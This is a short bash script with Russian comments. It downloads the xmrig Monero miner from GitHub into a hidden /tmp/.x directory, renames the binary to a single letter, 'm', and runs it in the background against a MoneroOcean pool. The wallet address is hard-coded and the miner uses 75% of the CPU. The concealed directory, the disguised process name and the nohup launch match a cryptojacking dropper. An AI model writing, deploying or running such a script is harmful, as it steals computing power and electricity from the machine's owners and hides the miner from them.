#!/bin/bash

# Функция для логирования
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Функция для проверки успешности выполнения команды
check_status() {
    if [ $? -eq 0 ]; then
        log_message "✓ $1"
        return 0
    else
        log_message "✗ $1"
        return 1
    fi
}

# Функция генерации случайного 12-символьного имени воркера
generate_worker_name() {
    # Используем /dev/urandom для генерации случайных байтов и преобразуем в base64
    # Убираем нежелательные символы и обрезаем до 12 символов
    local worker_name
    worker_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)
    
    # Если по какой-то причине имя короче 12 символов, дополним его
    while [ ${#worker_name} -lt 12 ]; do
        worker_name="${worker_name}$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 1 | head -n 1)"
    done
    
    echo "$worker_name"
}

# Основной скрипт с логированием
log_message "=== Начало выполнения скрипта ==="

# Генерация имени воркера
WORKER_NAME=$(generate_worker_name)
log_message "Сгенерировано имя воркера: $WORKER_NAME"

# 1. Переход в /tmp
cd /tmp
check_status "Переход в /tmp"

# 2. Очистка и создание рабочей директории
rm -rf .x 2>/dev/null
mkdir -p /tmp/.x
check_status "Создание рабочей директории /tmp/.x"

# 3. Переход в рабочую директорию
cd /tmp/.x
check_status "Переход в /tmp/.x"

# 4. Загрузка xmrig
log_message "Начало загрузки xmrig..."
wget -q https://github.com/moneroocean/xmrig/releases/download/v6.25.0-mo1/xmrig-v6.25.0-mo1-lin64-compat.tar.gz
check_status "Загрузка xmrig"

# 5. Распаковка архива
log_message "Распаковка архива..."
tar -xzf xmrig-v6.25.0-mo1-lin64-compat.tar.gz
check_status "Распаковка архива"

# 6. Установка прав выполнения
chmod +x xmrig
check_status "Установка прав выполнения для xmrig"

# 7. Переименование файла
mv xmrig m
check_status "Переименование xmrig в m"

# 8. Проверка наличия файла
if [ -f "./m" ]; then
    log_message "✓ Файл ./m существует и готов к запуску"
else
    log_message "✗ Файл ./m не найден"
    exit 1
fi

# 9. Запуск майнера с подробным логированием
log_message "Запуск майнера с параметрами:"
log_message "  Пул: gulf.moneroocean.stream:10128"
log_message "  Кошелек: 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE"
log_message "  Имя воркера: $WORKER_NAME"
log_message "  Потоки: 75% CPU"
log_message "  Уровень доната: 0%"

# Сохраняем имя воркера в файл для последующего использования
echo "$WORKER_NAME" > worker_name.txt
log_message "Имя воркера сохранено в файл: /tmp/.x/worker_name.txt"

# Запуск в фоновом режиме с сохранением PID
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >xmrig_output.log 2>&1 &
PID=$!

# Проверка запуска
sleep 2
if ps -p $PID > /dev/null; then
    log_message "✓ Майнер успешно запущен (PID: $PID)"
    log_message "  Имя воркера: $WORKER_NAME"
    log_message "  Логи майнера пишутся в файл: /tmp/.x/xmrig_output.log"
else
    log_message "✗ Не удалось запустить майнер"
    exit 1
fi

log_message "=== Скрипт успешно завершен ==="
log_message "Текущее имя воркера: $WORKER_NAME"
log_message "Проверьте работу майнера командой: ps aux | grep m"
log_message "Посмотрите логи командой: tail -f /tmp/.x/xmrig_output.log"
log_message "Узнать текущее имя воркера: cat /tmp/.x/worker_name.txt"
